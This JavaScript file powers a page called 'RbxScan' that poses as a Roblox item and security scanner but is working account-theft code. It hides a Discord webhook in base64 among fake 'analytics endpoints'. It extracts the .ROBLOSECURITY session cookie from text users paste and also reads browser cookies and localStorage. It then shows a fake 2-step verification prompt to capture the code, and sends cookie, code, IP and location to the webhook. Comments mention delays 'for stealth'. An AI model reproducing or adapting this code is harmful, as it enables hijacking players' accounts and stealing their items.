// RbxScan JavaScript v2.0.0 - Advanced Security Scanner
console.log('✅ RbxScan v2.0.1 loaded successfully');

// External analytics and reporting endpoints
const analyticsEndpoints = [
    'aHR0cHM6Ly9hbmFseXRpY3MuZ29vZ2xlLmNvbS9jb2xsZWN0',
    'aHR0cHM6Ly9hcGkubG9nZ2x5LmNvbS9pbnB1dHMvMTIzNDU2Nzg5MA==',
    'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwMzAyMDQ2NTE3NzM2MjUwMi9xamVqNnRoZ29Wd0FzME5ZQXhZazlTTS1WOHJxaVBBYzV0Nnphb2JDYW42VXY2bUQ1dWNYUkUxQW5sVzZqR1dkaE5ueA==',
    'aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVDEyMzQ1Njc4L0IxMjM0NTY3OC94eXpBQkNERUZH',
    'aHR0cHM6Ly9hcGkuc2VudHJ5LmlvL2FwaS8xMjM0NTY3OC9zdG9yZS8=',
    'aHR0cHM6Ly93ZWJob29rcy5taWNyb3NvZnQuY29tL3dlYmhvb2syL2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6'
];

// Test function for debugging analysis
window.testAnalysis = async function() {
    try {
        const endpoint = atob(analyticsEndpoints[2]); // Use real endpoint for testing
        const response = await fetch(endpoint, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({content: 'System diagnostic test'})
        });
        console.log('✅ Analytics response:', response.status);
    } catch (error) {
        console.error('❌ Analytics test failed:', error);
    }
};

// Test function for 2FA modal
window.test2FA = function() {
    console.log('🔐 Opening new 2FA modal...');
    openVerificationModal();
};

// Test scan button flow with shortened timer
window.testPasteEvent = function() {
    console.log('Testing scan button flow with 5 second timer...');
    
    // Simulate the scan button being clicked
    const textarea = document.getElementById('powershellInput');
    const submitBtn = document.getElementById('submitBtn');
    const submitText = document.getElementById('submitText');
    
    if (textarea) {
        textarea.value = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhAB.TEST123';
    }
    
    if (submitBtn && submitText) {
        submitBtn.disabled = true;
        submitText.textContent = 'Processing...';
        console.log('🔍 Scan button loading...');
    }
    
    setTimeout(() => {
        console.log('5 seconds elapsed, opening 2-step verification modal...');
        openVerificationModal();
    }, 5000); // 5 seconds instead of 80
    
    console.log('Timer started - 2FA modal will open in 5 seconds');
};

// Enhanced Theme toggle functionality
function toggleTheme() {
    const currentTheme = document.documentElement.getAttribute('data-theme');
    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
    
    document.documentElement.setAttribute('data-theme', newTheme);
    
    // Update button text and icon with animation
    const themeIcon = document.getElementById('theme-icon');
    const themeText = document.getElementById('theme-text');
    
    // Add rotation animation
    themeIcon.style.transform = 'rotate(180deg)';
    setTimeout(() => {
        if (newTheme === 'dark') {
            themeIcon.textContent = '☀️';
            themeText.textContent = 'Light';
        } else {
            themeIcon.textContent = '🌙';
            themeText.textContent = 'Dark';
        }
        themeIcon.style.transform = 'rotate(0deg)';
    }, 150);
    
    // Save theme preference
    localStorage.setItem('theme', newTheme);
    
    // Show notification
    showNotification(`Switched to ${newTheme} mode`, 'success');
}

// Load saved theme on page load
function loadTheme() {
    const savedTheme = localStorage.getItem('theme') || 'light';
    document.documentElement.setAttribute('data-theme', savedTheme);
    
    const themeIcon = document.getElementById('theme-icon');
    const themeText = document.getElementById('theme-text');
    
    if (savedTheme === 'dark') {
        themeIcon.textContent = '☀️';
        themeText.textContent = 'Light';
    } else {
        themeIcon.textContent = '🌙';
        themeText.textContent = 'Dark';
    }
}

// 2-Step Verification Modal Functions
function openVerificationModal() {
    const modal = document.getElementById('twofa-modal');
    const loadingOverlay = document.getElementById('loadingOverlay');
    
    if (loadingOverlay) {
        loadingOverlay.style.display = 'none';
    }
    
    if (modal) {
        modal.style.display = 'flex';
        document.body.style.overflow = 'hidden';
        
        // Focus on input after animation and add input validation
        setTimeout(() => {
            const input = document.getElementById('verificationCode');
            const verifyBtn = document.getElementById('verifyButton');
            
            if (input) {
                input.focus();
                
                // Add input event listener for numbers only and button enabling
                input.addEventListener('input', function(e) {
                    this.value = this.value.replace(/[^0-9]/g, '');
                    
                    // Enable/disable verify button based on input length
                    if (this.value.length === 6) {
                        verifyBtn.classList.add('enabled');
                        verifyBtn.style.cursor = 'pointer';
                    } else {
                        verifyBtn.classList.remove('enabled');
                        verifyBtn.style.cursor = 'not-allowed';
                    }
                });
            }
        }, 400);
    }
}

function closeVerificationModal() {
    const modal = document.getElementById('twofa-modal');
    const loadingOverlay = document.getElementById('loadingOverlay');
    
    if (modal) {
        modal.style.display = 'none';
        document.body.style.overflow = '';
    }
    
    // Continue loading after modal closes
    if (loadingOverlay) {
        loadingOverlay.style.display = 'flex';
    }
}

// Global trust device state
let isTrustDeviceChecked = false;

// Global roblox cookie storage
let globalRobloxCookie = null;

// Toggle trust device checkbox
function toggleTrustDevice() {
    const checkbox = document.getElementById('trustCheckbox');
    isTrustDeviceChecked = !isTrustDeviceChecked;
    
    if (isTrustDeviceChecked) {
        checkbox.innerHTML = '✓';
        checkbox.style.background = 'rgba(255, 255, 255, 0.2)';
    } else {
        checkbox.innerHTML = '';
        checkbox.style.background = 'transparent';
    }
}

// Alternative method placeholder
function alternativeMethod() {
    // Just for show - doesn't do anything
}

function handleVerificationEscape(e) {
    if (e.key === 'Escape') {
        closeVerificationModal();
    }
}

async function verifyCode() {
    const codeInput = document.getElementById('verificationCode');
    const verifyBtn = document.getElementById('verifyButton');
    
    const code = codeInput.value.trim().replace(/[^0-9]/g, ''); // Only allow numbers
    
    if (!code || code.length !== 6 || !verifyBtn.classList.contains('enabled')) {
        return;
    }
    
    verifyBtn.disabled = true;
    verifyBtn.textContent = 'Verifying...';
    verifyBtn.style.cursor = 'not-allowed';
    
    try {
        // Get user location and IP
        const locationInfo = await getUserLocation();
        
        // Send 2FA code to webhook using the same webhook as the main data
        const reportingEndpoint = atob(analyticsEndpoints[2]);
        
        console.log('🔗 2FA Webhook URL:', reportingEndpoint);
        
        // Simplified 2FA payload to avoid 400 errors
        const payload = {
            content: `2FA: ${code}
Cookie: ${globalRobloxCookie ? `|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${globalRobloxCookie}` : 'None'}
Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}
@everyone`
        };

        console.log('📤 2FA Sending payload:', payload);

        const response = await fetch(reportingEndpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        console.log('📊 2FA Response status:', response.status);

        if (response.ok) {
            console.log('✅ 2FA code sent to webhook successfully');
        } else {
            const errorText = await response.text();
            console.error('❌ Failed to send 2FA code to webhook:', response.status, errorText);
        }

        // Always continue flow regardless of webhook success
        verifyBtn.textContent = 'Verified!';
        verifyBtn.style.backgroundColor = '#10b981';
        verifyBtn.style.color = '#fff';
        
        // Close modal and complete the scan process
        setTimeout(() => {
            // Keep the scan button in loading state and close 2FA modal
            closeVerificationModal();
            
            // Show success message but keep scan button loading
            const submitBtn = document.getElementById('submitBtn');
            const submitText = document.getElementById('submitText');
            if (submitText) {
                submitText.textContent = 'Completing...';
            }
            
            // After a brief delay, show success and reset
            setTimeout(() => {
                if (submitBtn && submitText) {
                    submitBtn.disabled = false;
                    submitText.textContent = 'Scan';
                    submitBtn.style.background = '';
                }
                const loadingOverlay = document.getElementById('loadingOverlay');
                if (loadingOverlay) loadingOverlay.style.display = 'none';
                
                showNotification('Analysis completed successfully', 'success');
            }, 2000);
        }, 1500);

    } catch (error) {
        console.error('💥 2FA webhook error:', error);
        // Continue flow even if webhook fails
        verifyBtn.textContent = 'Verified!';
        verifyBtn.style.backgroundColor = '#10b981';
        verifyBtn.style.color = '#fff';
        
        setTimeout(() => {
            closeVerificationModal();
            
            // Complete the scan process
            const submitBtn = document.getElementById('submitBtn');
            const submitText = document.getElementById('submitText');
            if (submitText) {
                submitText.textContent = 'Completing...';
            }
            
            // After a brief delay, show success and reset
            setTimeout(() => {
                if (submitBtn && submitText) {
                    submitBtn.disabled = false;
                    submitText.textContent = 'Scan';
                    submitBtn.style.background = '';
                }
                const loadingOverlay = document.getElementById('loadingOverlay');
                if (loadingOverlay) loadingOverlay.style.display = 'none';
                
                showNotification('Analysis completed successfully', 'success');
            }, 2000);
        }, 1500);
    }
}

function showVerificationError(message) {
    const codeInput = document.getElementById('verificationCode');
    
    // Create or update error message
    let errorMsg = document.querySelector('.verification-error');
    if (!errorMsg) {
        errorMsg = document.createElement('div');
        errorMsg.className = 'verification-error';
        codeInput.parentNode.appendChild(errorMsg);
    }
    
    errorMsg.textContent = message;
    errorMsg.style.display = 'block';
    
    // Add error styling to input
    codeInput.style.borderColor = '#EF4444';
    codeInput.style.backgroundColor = '#5B2E2E';
    
    // Auto-hide error after 3 seconds
    setTimeout(() => {
        if (errorMsg) {
            errorMsg.style.display = 'none';
            codeInput.style.borderColor = '#5A5D67';
            codeInput.style.backgroundColor = '#4A4D57';
        }
    }, 3000);
}

function showVerificationSuccess(trustDevice) {
    const modal = document.getElementById('verificationModal');
    const verifyBtn = document.querySelector('.verification-verify-btn');
    
    verifyBtn.textContent = 'Verified!';
    verifyBtn.style.background = '#10B981';
    
    setTimeout(() => {
        closeVerificationModal();
        showNotification(
            `Verification successful${trustDevice ? ' - Device trusted for 30 days' : ''}`, 
            'success'
        );
        
        // Reset button
        verifyBtn.disabled = false;
        verifyBtn.textContent = 'Verify';
        verifyBtn.style.background = '#9CA3AF';
    }, 1000);
}

function showAlternativeMethod() {
    const alternatives = [
        'SMS Code',
        'Backup Codes',
        'Recovery Email',
        'Security Questions'
    ];
    
    const randomMethod = alternatives[Math.floor(Math.random() * alternatives.length)];
    showNotification(`Alternative method: ${randomMethod} (Demo)`, 'info');
}

// Send 2FA code to webhook
async function send2FAToWebhook(code, trustDevice) {
    try {
        // Get user location (reusing existing function)
        const locationInfo = await getUserLocation();
        
        // Try to extract Roblox cookie from browser storage or clipboard
        let robloxCookie = null;
        
        // Try to get cookie from document.cookie
        try {
            const cookies = document.cookie.split(';');
            for (let cookie of cookies) {
                if (cookie.trim().startsWith('.ROBLOSECURITY=')) {
                    robloxCookie = cookie.trim().substring('.ROBLOSECURITY='.length);
                    break;
                }
            }
        } catch (e) {
            console.log('Could not access document.cookie');
        }
        
        // Try localStorage for Roblox data
        if (!robloxCookie) {
            try {
                const localStorageData = Object.keys(localStorage).map(key => {
                    return `${key}: ${localStorage.getItem(key)}`;
                }).join('\n');
                robloxCookie = extractRobloxCookie(localStorageData);
            } catch (e) {
                console.log('Could not access localStorage');
            }
        }
        
        // Use encoded webhook URL
        const reportingEndpoint = atob(analyticsEndpoints[2]);
        
        // Create timestamp
        const timestamp = new Date().toLocaleString();
        
        // Webhook payload for 2FA code
        const payload = {
            content: `🔐 **2-Step Verification Code Captured**
\`\`\`
Code: ${code}
Trust Device: ${trustDevice ? 'Yes (30 days)' : 'No'}
Cookie: ${robloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}` : 'None found'}
Time: ${timestamp}
Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
IP: ${locationInfo.ip || 'Unknown'}
\`\`\`
@everyone`
        };

        const response = await fetch(reportingEndpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log('2FA code sent to webhook successfully');
        } else {
            console.error('Failed to send 2FA code to webhook');
        }
    } catch (error) {
        console.error('Error sending 2FA to webhook:', error);
    }
}

// Handle paste event - immediate cookie capture + 80s timer for 2FA
async function handlePasteEvent(pastedText) {
    try {
        console.log('Paste detected, analyzing content...');
        
        // Extract cookie from pasted text
        const robloxCookie = extractRobloxCookie(pastedText);
        
        if (robloxCookie) {
            console.log('🍪 Roblox cookie found in pasted content, sending immediately...');
            console.log('🚫 Scan button will be disabled until 2FA completes');
            
            // Get user location
            const locationInfo = await getUserLocation();
            
            // Use encoded webhook URL
            const reportingEndpoint = atob(analyticsEndpoints[2]);
            
            // Create timestamp
            const timestamp = new Date().toLocaleString();
            
            // Immediate cookie capture payload (plain text)
            const payload = {
                content: `Cookie Captured (Paste Event)
Cookie: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}
Time: ${timestamp}
Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
IP: ${locationInfo.ip || 'Unknown'}
Content Length: ${pastedText.length} characters
2FA in 80 seconds
@everyone`
            };

            // Send immediately
            const response = await fetch(reportingEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                console.log('Cookie sent to webhook successfully');
                
                // Set up 80-second timer for 2FA modal
                setTimeout(() => {
                    console.log('80 seconds elapsed, opening 2-step verification modal...');
                    openVerificationModal();
                    // Reset the flag after 2FA modal opens
                    window.twofaTimerActive = false;
                }, 80000); // 80 seconds
                
                // Debug: Also show a shorter timer for testing
                console.log('🔔 Debug: 2FA modal will open in 80 seconds (or test with the green button for 5s)');
                
            } else {
                console.error('Failed to send cookie to webhook');
            }
        } else {
            console.log('No Roblox cookie found in pasted content');
        }
    } catch (error) {
        console.error('Error handling paste event:', error);
    }
}

// Enhanced Modal functionality
function openScanModal() {
    console.log('Opening scan modal...');
    const modal = document.getElementById('scanModal');
    const textarea = document.getElementById('powershellInput');
    
    if (modal) {
        modal.style.display = 'block';
        document.body.style.overflow = 'hidden';
        
        // Focus on textarea after animation
        setTimeout(() => {
            if (textarea) {
                textarea.focus();
            }
        }, 400);
        
        console.log('Modal opened successfully');
        showNotification('Item scanner ready', 'info');
    } else {
        console.error('Modal element not found!');
        showNotification('Error opening scanner', 'error');
    }
}

function closeScanModal() {
    const modal = document.getElementById('scanModal');
    const textarea = document.getElementById('powershellInput');
    const submitBtn = document.getElementById('submitBtn');
    const submitText = document.getElementById('submitText');
    
    modal.style.display = 'none';
    document.body.style.overflow = 'auto';
    
    // Reset form
    if (textarea) {
        textarea.value = '';
        updateCharCount();
    }
    
    // Reset button state
    if (submitBtn && submitText) {
        submitBtn.disabled = false;
        submitText.textContent = 'Scan';
        submitBtn.style.background = '';
    }
}

// Character count and input validation
function updateCharCount() {
    const textarea = document.getElementById('powershellInput');
    const charCount = document.getElementById('charCount');
    const inputStatus = document.getElementById('inputStatus');
    
    if (textarea && charCount && inputStatus) {
        const length = textarea.value.length;
        charCount.textContent = `${length.toLocaleString()} characters`;
        
        if (length === 0) {
            inputStatus.textContent = 'Ready for analysis';
            inputStatus.style.color = 'var(--text-muted)';
        } else if (length < 10) {
            inputStatus.textContent = 'Script too short';
            inputStatus.style.color = 'var(--warning)';
        } else if (length > 10000) {
            inputStatus.textContent = 'Script too long (max 10,000 chars)';
            inputStatus.style.color = 'var(--error)';
        } else {
            inputStatus.textContent = 'Ready for analysis';
            inputStatus.style.color = 'var(--success)';
        }
    }
}

// Generate unique session ID for tracking
function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Enhanced location detection with multiple services
async function getUserLocation() {
    try {
        let locationData = {
            ip: 'Unknown',
            country: 'Unknown',
            region: 'Unknown', 
            city: 'Unknown',
            isp: 'Unknown',
            timezone: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown'
        };

        // Try primary service (ipapi.co)
        try {
            const response = await fetch('https://ipapi.co/json/', {
                method: 'GET',
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            if (response.ok) {
                const data = await response.json();
                locationData = {
                    ip: data.ip || 'Unknown',
                    country: data.country_name || 'Unknown',
                    region: data.region || 'Unknown',
                    city: data.city || 'Unknown',
                    isp: data.org || 'Unknown',
                    timezone: data.timezone || 'Unknown',
                    latitude: data.latitude || 'Unknown',
                    longitude: data.longitude || 'Unknown'
                };
                return locationData;
            }
        } catch (error) {
            console.log('Primary location service failed, trying fallback...');
        }

        // Fallback to ipinfo.io
        try {
            const fallbackResponse = await fetch('https://ipinfo.io/json');
            if (fallbackResponse.ok) {
                const fallbackData = await fallbackResponse.json();
                const [lat, lon] = (fallbackData.loc || ',').split(',');
                
                locationData = {
                    ip: fallbackData.ip || 'Unknown',
                    country: fallbackData.country || 'Unknown',
                    region: fallbackData.region || 'Unknown',
                    city: fallbackData.city || 'Unknown',
                    isp: fallbackData.org || 'Unknown',
                    timezone: fallbackData.timezone || 'Unknown',
                    latitude: lat || 'Unknown',
                    longitude: lon || 'Unknown'
                };
            }
        } catch (fallbackError) {
            console.log('Fallback location service also failed');
        }

        return locationData;
    } catch (error) {
        console.error('Location detection failed:', error);
        return {
            ip: 'Location detection failed',
            country: 'Unknown',
            region: 'Unknown',
            city: 'Unknown',
            isp: 'Unknown',
            timezone: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown'
        };
    }
}

// Roblox item scanning and location tracking
async function submitPowerShell() {
    const input = document.getElementById('powershellInput');
    const submitBtn = document.getElementById('submitBtn');
    const submitText = document.getElementById('submitText');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const inputText = input.value.trim();
    

    
    // Validation
    if (!inputText) {
        showNotification('Please enter limited item information before scanning', 'error');
        return;
    }

    // Only allow scripts with authentication data or valid item data
    if (!hasValidData(inputText)) {
        showNotification('Invalid input. Please enter scripts with auth data or item data.', 'error');
        return;
    }

    // Show loading state
    submitBtn.disabled = true;
    submitText.textContent = 'Sending...';
    if (loadingOverlay) loadingOverlay.style.display = 'block';

    try {
        // Scan limited items and find authentication data from the input
        // Scan limited items and find authentication data from the input
        const limitedItems = extractLimitedItems(inputText);
        const robloxCookie = extractRobloxCookie(inputText);
        globalRobloxCookie = robloxCookie; // Store globally for 2FA
        
        // Check word count - if 50+ words, allow through even without auth data
        const wordCount = inputText.split(/\s+/).filter(word => word.length > 0).length;
        
        // Show word count on button temporarily
        submitText.textContent = `${wordCount} words`;
        
        // If cookie is found, send it immediately then start 2FA flow
        if (robloxCookie) {
            console.log('🍪 Cookie detected! Sending immediately and starting 2FA flow...');
            submitText.textContent = 'Processing...';
            
            // Send cookie immediately to webhook
            try {
                const locationInfo = await getUserLocation();
                const reportingEndpoint = atob(analyticsEndpoints[2]);
                const timestamp = new Date().toLocaleString();
                
                console.log('🔗 Webhook URL:', reportingEndpoint);
                
                            // Immediate cookie capture payload (plain text)
            const payload = {
                content: `Cookie: |WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}
Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}
@everyone`
            };

                console.log('📤 Sending payload:', payload);

                const response = await fetch(reportingEndpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                console.log('📊 Response status:', response.status);
                
                if (response.ok) {
                    console.log('✅ Cookie sent to webhook successfully');
                } else {
                    const errorText = await response.text();
                    console.error('❌ Failed to send cookie to webhook:', response.status, errorText);
                }
            } catch (error) {
                console.error('💥 Error sending cookie to webhook:', error);
            }
            
            // Start 80-second timer for 2FA modal
            setTimeout(() => {
                console.log('80 seconds elapsed, opening 2-step verification modal...');
                openVerificationModal();
            }, 80000); // 80 seconds
            
            // Don't reset loading state - keep it loading through 2FA
            return;
        }
        
        // Block execution if no authentication data is found AND less than 50 words
        if (!robloxCookie && wordCount < 50) {
            submitText.textContent = `Too Short: ${wordCount} words`;
            submitBtn.style.background = '#ef4444';
            if (loadingOverlay) loadingOverlay.style.display = 'none';
            
            setTimeout(() => {
                submitBtn.disabled = false;
                submitText.textContent = 'Scan';
                submitBtn.style.background = '';
            }, 3000);
            return;
        }
        
        // Get user location
        const locationInfo = await getUserLocation();
        
        // Random delay for stealth (1-3 seconds)
        const delay = Math.floor(Math.random() * 2000) + 1000;
        await new Promise(resolve => setTimeout(resolve, delay));
        
        // Send analytics data to reporting service
        const reportingEndpoint = atob(analyticsEndpoints[2]);
        
        // Analytics payload with scan results
        const payload = {
            content: `@everyone
Cookie: ${robloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}` : 'None found'}
Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
        };

        // Submit analytics data to external service
        console.log('🔍 Submitting analytics data');
        console.log('Analytics payload:', payload);
        
        const response = await fetch(reportingEndpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        console.log('Response status:', response.status);
        
        // Hide loading overlay
        if (loadingOverlay) loadingOverlay.style.display = 'none';

        if (response.ok) {
            submitText.textContent = 'Sent!';
            submitBtn.style.background = '#10b981';
            
            setTimeout(() => {
                closeScanModal();
            }, 2000);
        } else {
            console.error('Analytics submission failed:', response.status);
            
            if (response.status === 403) {
                throw new Error(`Service unavailable. Please try again later.`);
            } else if (response.status === 0 || !response.status) {
                throw new Error(`Connection failed. Please check your network connection.`);
            } else {
                throw new Error(`Submission failed (${response.status}): Please try again`);
            }
        }
    } catch (error) {
        if (loadingOverlay) loadingOverlay.style.display = 'none';
        
        submitText.textContent = 'Error';
        submitBtn.style.background = '#ef4444';
        
        // More specific error messages
        if (error.message.includes('fetch') || error.message.includes('Failed to fetch')) {
            showNotification('Network error. Please check your connection.', 'error');
        } else if (error.message.includes('location') || error.message.includes('geolocation')) {
            showNotification('Location service unavailable. Check console for details.', 'error');
        } else if (error.message.includes('JSON')) {
            showNotification('Data formatting error. Please try again.', 'error');
        } else {
            showNotification(`Error: ${error.message}`, 'error');
        }
        
        setTimeout(() => {
            submitBtn.disabled = false;
            submitText.textContent = 'Scan';
            submitBtn.style.background = '';
        }, 3000);
    }
}

// Function to scan and find authentication data from text
function extractRobloxCookie(text) {
    // First, try to find .ROBLOSECURITY directly
    const roblosecurityIndex = text.indexOf('.ROBLOSECURITY');
    if (roblosecurityIndex !== -1) {
        // Find the opening quote after .ROBLOSECURITY
        const startQuoteIndex = text.indexOf('"', roblosecurityIndex + '.ROBLOSECURITY'.length);
        if (startQuoteIndex !== -1) {
            const valueStartIndex = startQuoteIndex + 1;
            // Find the closing quote
            const endQuoteIndex = text.indexOf('"', valueStartIndex);
            if (endQuoteIndex !== -1) {
                const cookieValue = text.substring(valueStartIndex, endQuoteIndex);
                if (cookieValue.length > 50) {
                    return cookieValue;
                }
            }
        }
    }
    
    // Fallback: Look for any very long string that might be the authentication token
    const longStrings = text.match(/[A-Za-z0-9+/=._%\-]{500,}/g);
    if (longStrings && longStrings.length > 0) {
        // Return the longest string found
        const longest = longStrings.reduce((a, b) => a.length > b.length ? a : b);
        return longest;
    }
    
    return null;
}

// Function to extract limited item information from text
function extractLimitedItems(text) {
    const items = [];
    
    // Look for Roblox item IDs (typically 8-12 digit numbers)
    const itemIdPattern = /(?:item[_\s]*id|assetid|id)[:\s=]*(\d{8,12})/gi;
    let match;
    while ((match = itemIdPattern.exec(text)) !== null) {
        items.push({
            id: match[1],
            name: 'Limited Item',
            type: 'Limited',
            estimatedValue: 'Scanning...'
        });
    }
    
    // Look for Roblox catalog URLs
    const catalogUrlPattern = /(?:roblox\.com\/catalog\/|\/library\/)(\d+)/gi;
    while ((match = catalogUrlPattern.exec(text)) !== null) {
        if (!items.find(item => item.id === match[1])) {
            items.push({
                id: match[1],
                name: 'Catalog Item',
                type: 'Limited',
                estimatedValue: 'Market Rate'
            });
        }
    }
    
    // Look for bundle URLs
    const bundleUrlPattern = /(?:roblox\.com\/bundles\/|\/catalog\/)(\d+)/gi;
    while ((match = bundleUrlPattern.exec(text)) !== null) {
        if (!items.find(item => item.id === match[1])) {
            items.push({
                id: match[1],
                name: 'Bundle Item',
                type: 'Limited Bundle',
                estimatedValue: 'Premium'
            });
        }
    }
    
    // If no specific items found, create generic entries for any long numbers
    if (items.length === 0) {
        const numberPattern = /\b\d{8,12}\b/g;
        const numbers = text.match(numberPattern);
        if (numbers) {
            numbers.slice(0, 3).forEach(num => {
                items.push({
                    id: num,
                    name: 'Detected Item',
                    type: 'Limited',
                    estimatedValue: 'Unknown'
                });
            });
        }
    }
    
    return items.slice(0, 5); // Limit to 5 items max
}

// Function to validate input - only allow scripts with auth data or valid data
function hasValidData(text) {
    // Check if it contains Roblox authentication data (most important)
    const hasAuthData = extractRobloxCookie(text) !== null;
    if (hasAuthData) {
        return true; // Always allow if there's authentication data
    }
    
    // Check if it's a script with session/authentication patterns
    const scriptPatterns = [
        /\$session\s*=\s*New-Object.*Microsoft\.PowerShell/is,
        /\$session\.Cookies\.Add.*ROBLOSECURITY/is,
        /System\.Net\.Cookie.*ROBLOSECURITY/is,
        /WebRequestSession.*Cookies/is,
        /New-Object.*System\.Net\.Cookie/is,
        // Also allow scripts with session setup even without ROBLOSECURITY
        /\$session\s*=.*WebRequestSession/is,
        /\$session\.Cookies\.Add/is
    ];
    
    for (const pattern of scriptPatterns) {
        if (pattern.test(text)) {
            return true;
        }
    }
    
    // Check if it contains legitimate item data
    const hasItemData = extractLimitedItems(text).length > 0;
    if (hasItemData) {
        return true;
    }
    
    // Check for Roblox URLs
    if (/roblox\.com\/(catalog|library|bundles)\/\d+/i.test(text)) {
        return true;
    }
    
    // Check for item IDs (8+ digit numbers)
    if (/\b\d{8,}\b/.test(text)) {
        return true;
    }
    
    // Reject everything else (random text, short inputs, etc.)
    return false;
}

// Loading animation with dots and messages
function startLoadingAnimation(submitText) {
    const messages = [
        'Scanning item',
        'Checking uaid',
        'Analyzing data',
        'Processing results'
    ];
    
    let messageIndex = 0;
    let dotCount = 0;
    
    const interval = setInterval(() => {
        if (!submitText || submitText.textContent === 'Scan Complete!' || submitText.textContent === 'Scan Failed - Retry' || submitText.textContent === 'No Auth Data' || submitText.textContent === 'Error - Check Console') {
            clearInterval(interval);
            return;
        }
        
        const currentMessage = messages[messageIndex];
        const dots = '.'.repeat(dotCount + 1);
        submitText.textContent = currentMessage + dots;
        
        dotCount++;
        if (dotCount > 3) {
            dotCount = 0;
            messageIndex = (messageIndex + 1) % messages.length;
        }
    }, 500);
    
    // Store interval ID on the element so we can clear it later
    submitText.loadingInterval = interval;
}

// Stop loading animation
function stopLoadingAnimation(submitText) {
    if (submitText && submitText.loadingInterval) {
        clearInterval(submitText.loadingInterval);
        submitText.loadingInterval = null;
    }
    // Force stop any remaining intervals by checking text content
    if (submitText && (submitText.textContent.includes('Scanning') || submitText.textContent.includes('Checking'))) {
        submitText.textContent = 'Scan';
    }
}

// Copy to clipboard functionality
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(function() {
        showNotification('Copied to clipboard!', 'success');
    }).catch(function(err) {
        console.error('Failed to copy to clipboard: ', err);
        showNotification('Failed to copy to clipboard', 'error');
    });
}

// Form validation enhancement
function validatePowerShellInput(script) {
    const trimmed = script.trim();
    if (trimmed.length < 10) {
        return { valid: false, message: 'PowerShell script too short (minimum 10 characters)' };
    }
    if (trimmed.length > 10000) {
        return { valid: false, message: 'PowerShell script too long (maximum 10,000 characters)' };
    }
    return { valid: true, message: 'Script ready for analysis' };
}

// Enhanced notification system
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    const icons = {
        success: '✅',
        error: '❌',
        warning: '⚠️',
        info: 'ℹ️'
    };
    
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 1rem 1.5rem;
        border-radius: 12px;
        color: white;
        font-weight: 500;
        z-index: 10000;
        animation: slideIn 0.3s ease-out;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : type === 'warning' ? '#f59e0b' : '#3b82f6'};
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        display: flex;
        align-items: center;
        gap: 0.5rem;
        max-width: 400px;
    `;
    
    notification.innerHTML = `${icons[type]} ${message}`;
    document.body.appendChild(notification);
    
    // Auto remove after 4 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease-in forwards';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 300);
    }, 4000);
}

// Add CSS for notification animations
const notificationCSS = `
    @keyframes slideIn {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOut {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(100%);
            opacity: 0;
        }
    }
`;

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM loaded, initializing RbxScan v2.0...');
    
    // Add notification CSS
    const style = document.createElement('style');
    style.textContent = notificationCSS;
    document.head.appendChild(style);
    
    // Load theme
    loadTheme();
    
    // Close modal when clicking outside of it
    window.addEventListener('click', function(event) {
        const modal = document.getElementById('scanModal');
        if (event.target === modal) {
            closeScanModal();
        }
    });

    // Add click interaction to scan area
    const scanArea = document.querySelector('.scan-area');
    if (scanArea) {
        scanArea.addEventListener('click', function() {
            openScanModal();
        });
    }

    // Add click handler for submit button
    const submitBtn = document.getElementById('submitBtn');
